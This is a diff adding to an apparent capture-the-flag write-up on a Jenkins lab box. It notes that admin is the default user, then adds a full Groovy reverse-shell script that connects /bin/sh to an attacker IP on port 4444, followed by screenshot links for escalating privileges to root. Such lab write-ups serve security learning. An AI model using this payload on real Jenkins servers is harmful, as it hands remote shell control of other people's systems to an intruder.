@@ -45,4 +45,24 @@ in the attacker machine :
 
   - we could use OWSAP ZAP tool to fuzz it and check respondes that has different size and those make this as relevent passwords to try and than try with diff usernames
   - but admin is default user in jenkins so we tried it first
+ 
+## now lets make reverse shell as we did in the wp website  using groovy script :
+
+String host="10.9.149.158";
+int port=4444;
+String cmd="/bin/sh";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+
+![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/979f076d-abb9-4ac2-9cd4-f949993d67bc)
+
+PE  to root :
+![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/3d89a279-7245-4ad6-a910-8b3465920bb3)
+![image](https://github.com/ArielElb/TryHackMe-CTFs/assets/94087682/dfca5acc-ad90-472c-95ee-70e65305512c)
+
+
+
+
+
+
 
